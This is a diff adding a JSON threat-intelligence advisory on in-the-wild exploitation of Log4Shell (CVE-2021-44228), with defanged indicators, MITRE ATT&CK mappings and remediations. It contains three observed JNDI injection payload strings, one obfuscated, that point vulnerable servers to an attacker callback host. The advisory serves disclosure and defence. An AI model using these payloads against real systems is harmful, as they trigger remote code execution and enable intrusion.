@@ -1,0 +1,69 @@
+{
+  "advisory_id": "CTI-ADV-2026-0044",
+  "title": "Active In-The-Wild Exploitation of Apache Log4j (Log4Shell)",
+  "source": "Global Threat Intelligence Operations",
+  "severity": "CRITICAL",
+  "tlp": "WHITE",
+  "target_cve": "CVE-2021-44228",
+  "vulnerability_type": "Remote Code Execution via JNDI Injection",
+  "incident_narrative": "Adversaries are scanning perimeter Apache Solr, Elasticsearch, and VMware Horizon appliances using automated JNDI LDAP lookup strings. Successful execution downloads secondary shell scripts and drops cryptocurrency miners and Cobalt Strike beacons.",
+  "observed_payload_strings": [
+    "${jndi:ldap://203.0.113.99:1389/Exploit}",
+    "${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:ldap}://203.0.113.99:1389/a}",
+    "${jndi:dns://203.0.113.99:53/log4j-test}"
+  ],
+  "indicators": [
+    {
+      "type": "IPv4",
+      "value": "203.0.113.99",
+      "context": "Malicious LDAP/JNDI Callback Server"
+    },
+    {
+      "type": "CVE",
+      "value": "CVE-2021-44228",
+      "context": "Log4Shell RCE Flaw"
+    },
+    {
+      "type": "URL",
+      "value": "hxxp://malicious-log4j-delivery[.]example[.]com/drop.sh",
+      "context": "Bash Dropper Script"
+    },
+    {
+      "type": "Domain",
+      "value": "malicious-log4j-delivery[.]example[.]com",
+      "context": "Staging Server Hostname"
+    },
+    {
+      "type": "SHA256",
+      "value": "a1b2c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0",
+      "context": "ELF CryptoMiner Binary"
+    }
+  ],
+  "mitre_attack": {
+    "tactics": [
+      "Initial Access",
+      "Execution",
+      "Command and Control"
+    ],
+    "techniques": [
+      {
+        "id": "T1190",
+        "name": "Exploit Public-Facing Application"
+      },
+      {
+        "id": "T1059.004",
+        "name": "Unix Shell Script Interpreter"
+      },
+      {
+        "id": "T1071.001",
+        "name": "Web Protocols"
+      }
+    ]
+  },
+  "recommended_remediations": [
+    "Upgrade log4j-core library to version 2.17.1 or later immediately.",
+    "Set system property log4j2.formatMsgNoLookups=true on legacy runtime JVMs.",
+    "Apply WAF pattern block rules inspecting HTTP User-Agent, X-Api-Version, and Referer headers.",
+    "Sinkhole outbound connections to IP 203.0.113.99 on perimeter firewalls."
+  ]
+}
